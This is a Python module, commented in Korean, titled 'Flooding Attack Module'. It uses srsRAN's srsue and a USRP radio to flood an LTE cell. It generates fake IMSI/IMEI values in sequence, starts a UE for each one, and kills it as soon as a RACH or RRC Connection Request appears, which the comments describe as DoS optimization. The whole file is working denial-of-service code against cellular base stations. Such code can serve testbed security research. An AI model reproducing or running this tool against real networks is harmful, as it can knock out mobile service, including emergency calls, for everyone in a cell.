#!/usr/bin/env python3
"""
Flooding Attack Module
config 파일들을 사용하여 공격을 실행하는 기능을 담당합니다.
"""

import subprocess
import time
import os
import sys
import logging
from typing import Optional, Tuple

logger = logging.getLogger(__name__)


def generate_imsi_imei(unique_id: int, mcc: Optional[int] = None, mnc: Optional[int] = None) -> Tuple[str, str]:
    """
    unique_id로부터 IMSI와 IMEI를 생성합니다.
    
    Args:
        unique_id: 고유 식별자 (1부터 시작)
        mcc: Mobile Country Code (선택)
        mnc: Mobile Network Code (선택)
    
    Returns:
        (imsi, imei) 튜플
    """
    # IMSI 생성
    if mcc is not None and mnc is not None:
        mnc_digits = 3 if mnc >= 100 else 2
        mcc_mnc_len = 3 + mnc_digits
        msin_len = 15 - mcc_mnc_len
        imsi = f"{mcc:03d}{mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
    elif mcc is not None:
        imsi = f"{mcc:03d}01{unique_id:010d}"
    elif mnc is not None:
        mnc_digits = 3 if mnc >= 100 else 2
        mcc_mnc_len = 3 + mnc_digits
        msin_len = 15 - mcc_mnc_len
        imsi = f"001{mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
    else:
        imsi = f"00101{unique_id:010d}"
    
    # IMEI 포맷팅 (15자리)
    imei_suffix = f"{unique_id:06d}"
    imei = f"35349006{imei_suffix}0"  # 총 15자리
    
    return imsi, imei


def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[str] = None,
                          imsi: Optional[str] = None, imei: Optional[str] = None,
                          usim_opc: Optional[str] = None, usim_k: Optional[str] = None,
                          earfcn: Optional[int] = None) -> subprocess.Popen:
    """
    템플릿 config 파일로 srsue 실행 (명령줄 인자로 IMSI/IMEI 오버라이드)
    
    Args:
        config_path: 템플릿 config 파일 경로
        log_file: 로그 파일 경로
        usrp_args: USRP 장치 인자
        imsi: IMSI (명령줄 인자로 오버라이드)
        imei: IMEI (명령줄 인자로 오버라이드)
        usim_opc: USIM OPC (명령줄 인자로 오버라이드)
        usim_k: USIM K (명령줄 인자로 오버라이드)
        earfcn: EARFCN (명령줄 인자로 오버라이드)
    """
    # config 파일 경로를 절대 경로로 변환
    if not os.path.isabs(config_path):
        config_path = os.path.abspath(config_path)
    
    # config 파일 존재 확인
    if not os.path.exists(config_path):
        raise FileNotFoundError(f"Config 파일을 찾을 수 없습니다: {config_path}")
    
    cmd = [
        "srsue",
        config_path,
        "--log.filename", log_file,
        "--log.all_level", "info"
    ]
    
    # device_args를 명령어 옵션으로 추가
    if usrp_args:
        cmd.extend(["--rf.device_args", usrp_args])
    
    # IMSI/IMEI를 명령줄 인자로 오버라이드
    if imsi:
        cmd.extend(["--usim.imsi", imsi])
    if imei:
        cmd.extend(["--usim.imei", imei])
    if usim_opc:
        cmd.extend(["--usim.opc", usim_opc])
    if usim_k:
        cmd.extend(["--usim.k", usim_k])
    if earfcn is not None:
        cmd.extend(["--rat.eutra.dl_earfcn", str(earfcn)])
    
    # 디버깅: 첫 번째 UE 실행 시 명령어 출력
    if imsi and imsi.endswith('000000001'):  # 첫 번째 UE 감지
        logger.debug(f"srsue 실행 명령어: {' '.join(cmd[:10])}... (전체 {len(cmd)}개 인자)")
    
    kwargs = {
        'stdout': subprocess.PIPE,
        'stderr': subprocess.PIPE,
    }
    if hasattr(os, 'setsid'):
        kwargs['preexec_fn'] = os.setsid
    elif sys.platform == 'darwin':
        kwargs['start_new_session'] = False
    
    return subprocess.Popen(cmd, **kwargs)


def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, running_flag=None,
                        mcc: Optional[int] = None, mnc: Optional[int] = None, 
                        earfcn: Optional[int] = None, usim_opc: Optional[str] = None,
                        usim_k: Optional[str] = None, max_ue_count: int = 500):
    """
    템플릿 config 파일과 동적 IMSI/IMEI 생성으로 공격을 실행합니다.
    
    Args:
        template_config: 템플릿 config 파일 경로
        usrp_args: USRP 장치 인자
        running_flag: 실행 중 플래그 (None이면 계속 실행)
        mcc: Mobile Country Code
        mnc: Mobile Network Code
        earfcn: 주파수 채널 번호
        usim_opc: USIM OPC 키
        usim_k: USIM K 키
        max_ue_count: 사용하지 않음 (하위 호환성 유지용, UE ID는 계속 증가)
    """
    if not os.path.exists(template_config):
        logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {template_config}")
        return
    
    logger.info("Flooding 공격 시작...")
    
    ue_id = 1
    current_process = None
    process_start_time = None
    current_log_file = None
    last_log_position = {}  # 각 로그 파일의 마지막 읽은 위치 저장
    # 타임아웃 제거: 로그 기반으로만 종료
    
    try:
        loop_count = 0
        while running_flag is None or running_flag():
            loop_count += 1
            
            # 현재 프로세스가 없거나 종료되었으면 다음 UE 실행
            if current_process is None or current_process.poll() is not None:
                # 이전 프로세스가 있으면 정리 (즉시 kill)
                if current_process and current_process.poll() is None:
                    current_process.kill()
                
                # IMSI/IMEI 생성 (UE ID는 계속 증가)
                imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
                current_log_file = f"/tmp/srsue_{ue_id}_{int(time.time() * 1000)}.log"
                
                try:
                    current_process = run_srsue_with_config(
                        template_config, current_log_file, usrp_args,
                        imsi=imsi, imei=imei,
                        usim_opc=usim_opc, usim_k=usim_k,
                        earfcn=earfcn
                    )
                    process_start_time = time.time()
                    
                    # 간단한 메시지만 출력
                    logger.info(f"config_{ue_id} 보냄")
                    ue_id += 1
                except Exception as e:
                    logger.error(f"UE {ue_id} 실행 오류: {e}")
                    ue_id += 1
                    continue
            
            # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
            # 로그 기반으로 즉시 종료하므로 타임아웃은 최후의 수단으로만 사용
            if current_process:
                # 프로세스가 종료되었는지 먼저 확인
                poll_result = current_process.poll()
                if poll_result is not None:
                    # 프로세스가 종료됨 (로그 출력 제거)
                    elapsed = time.time() - process_start_time if process_start_time else 0
                    return_code = current_process.returncode
                    # 로그 위치 정보 정리
                    if current_log_file in last_log_position:
                        del last_log_position[current_log_file]
                    current_process = None
                    process_start_time = None
                    current_log_file = None
                    continue
                
                # 로그 파일이 생성되었는지 확인
                if current_log_file and os.path.exists(current_log_file):
                    try:
                        with open(current_log_file, 'r', encoding='utf-8', errors='ignore') as f:
                            # 마지막 읽은 위치로 이동
                            if current_log_file in last_log_position:
                                f.seek(last_log_position[current_log_file])
                            else:
                                last_log_position[current_log_file] = 0
                            
                            # 새로 추가된 내용만 읽기 (로그는 출력하지 않고 키워드 체크만)
                            new_content = f.read()
                            if new_content:
                                # 마지막 위치 업데이트 (로그 출력은 하지 않음)
                                last_log_position[current_log_file] = f.tell()
                            
                            # 전체 로그 내용도 읽어서 키워드 체크 (파일 처음부터)
                            f.seek(0)
                            log_content = f.read()
                        
                        # RRC Connection Request 전송 확인 (정확히 이것만 체크)
                        rrc_request_sent = any(keyword in log_content.lower() for keyword in [
                            'rrc connection request',
                            'sending rrc connection request',
                            'rrc connection request sent'
                        ])
                        
                        # RACH 전송도 체크 (RRC Request 전 단계)
                        rach_sent = any(keyword in log_content.lower() for keyword in [
                            'random access',
                            'rach',
                            'preamble',
                            'sending rach'
                        ])
                        
                        # 셀 동기화 또는 attach 시도 확인 (더 빠른 종료를 위해)
                        cell_synced = any(keyword in log_content.lower() for keyword in [
                            'synchronized to cell',
                            'cell synchronized',
                            'attaching ue',
                            'attach request',
                            'found cell',
                            'cell found'
                        ])
                        
                        # PBCH 디코딩 실패 확인
                        pbch_failed = 'could not decode pbch' in log_content.lower()
                        elapsed = time.time() - process_start_time if process_start_time else 0
                        
                        # RRC Connection Request를 보냈으면 즉시 종료 (Setup은 무시)
                        if rrc_request_sent:
                            # RRC Request 전송 확인 → 즉시 종료하고 다음 UE로
                            if current_process.poll() is None:
                                current_process.kill()
                            # 로그 위치 정보 정리
                            if current_log_file in last_log_position:
                                del last_log_position[current_log_file]
                            current_process = None
                            process_start_time = None
                            current_log_file = None
                            continue
                        elif rach_sent:
                            # RACH 전송 감지 시 즉시 종료
                            if current_process.poll() is None:
                                current_process.kill()
                            # 로그 위치 정보 정리
                            if current_log_file in last_log_position:
                                del last_log_position[current_log_file]
                            current_process = None
                            process_start_time = None
                            current_log_file = None
                            continue
                        elif cell_synced:
                            # 셀 동기화 감지 시 즉시 종료
                            if current_process.poll() is None:
                                current_process.kill()
                            # 로그 위치 정보 정리
                            if current_log_file in last_log_position:
                                del last_log_position[current_log_file]
                            current_process = None
                            process_start_time = None
                            current_log_file = None
                            continue
                        elif pbch_failed:
                            # PBCH 디코딩 실패 시 즉시 종료
                            if current_process.poll() is None:
                                current_process.kill()
                            # 로그 위치 정보 정리
                            if current_log_file in last_log_position:
                                del last_log_position[current_log_file]
                            current_process = None
                            process_start_time = None
                            current_log_file = None
                            continue
                    except Exception as e:
                        logger.debug(f"로그 파일 읽기 오류: {e}")
                elif current_log_file:
                    # 로그 파일이 아직 생성되지 않음
                    elapsed = time.time() - process_start_time if process_start_time else 0
                    # 프로세스 상태 확인
                    if current_process.poll() is not None:
                        # 로그 위치 정보 정리
                        if current_log_file in last_log_position:
                            del last_log_position[current_log_file]
                        current_process = None
                        process_start_time = None
                        current_log_file = None
                        continue
            
            # 최후의 수단: 타임아웃 체크 제거 (로그 기반으로만 종료)
            
            # 대기 없이 계속 확인 (더 빠른 전송)
            
    except KeyboardInterrupt:
        pass
    finally:
        # 정리 (즉시 kill)
        if current_process and current_process.poll() is None:
            current_process.kill()

